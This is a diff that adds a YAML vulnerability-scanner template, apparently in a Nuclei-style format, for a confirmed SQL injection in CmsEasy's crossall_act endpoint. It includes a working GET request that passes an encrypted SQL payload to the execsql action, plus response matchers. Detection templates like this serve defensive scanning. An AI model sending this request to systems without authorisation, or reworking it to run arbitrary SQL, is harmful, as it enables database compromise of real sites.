@@ -1,0 +1,22 @@
+id: cmseasy-crossall-sqli
+name: CmsEasy crossall_act - SQL Injection
+severity: high
+confidence: confirmed
+description: CmsEasy crossall_act.php SQL Injection Vulnerability. CmsEasy has a SQL injection vulnerability. Any SQL command
+  can be executed by encrypting the SQL statement in the file service.php.
+reference: https://cn-sec.com/archives/1580677.html
+tags:
+- cmseasy
+- sqli
+- vuln
+requests:
+- method: GET
+  path: /?case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK
+  matchers:
+  - type: body
+    words:
+    - '{"123":"123"}'
+  - type: status
+    status:
+    - 200
+  condition: and
